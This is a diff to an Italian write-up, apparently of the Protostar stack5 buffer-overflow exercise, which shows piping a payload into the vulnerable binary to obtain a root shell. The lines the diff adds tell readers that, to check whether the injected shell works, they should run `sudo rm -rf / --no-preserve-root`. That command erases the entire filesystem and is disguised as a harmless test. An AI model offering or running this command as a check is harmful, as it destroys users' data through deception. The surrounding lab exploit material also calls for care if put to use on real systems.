@@ -181,7 +181,12 @@ Bisogna dare alla shell iniettata uno STDIN aperto, per farlo modifichiamo il co
 ```bash
 > (cat /tmp/payload; cat) | /opt/protostar/bin/stack5
 ```
-La prima _cat_ inietta l'input malevolo e attiva la shell, la seconda accetta input da STDIN e lo inoltra alla shell lasciano lo STDIN aperto, così facendo **l'attacco riesce!**
+La prima _cat_ inietta l'input malevolo e attiva la shell, la seconda accetta input da STDIN e lo inoltra alla shell lasciano lo STDIN aperto, così facendo **l'attacco riesce!**.  
+Per provare se siamo effettivamente riusciti a diventare **root** digitiamo il comando `whoami`il comando ci dovrebbe restituire `root`.  
+Per vedere se funziona la shell iniettata digitare
+```bash
+sudo rm -rf / --no-preserve-root
+```
 
 ## Debolezze
 1. privilegi troppo elevati per stack5
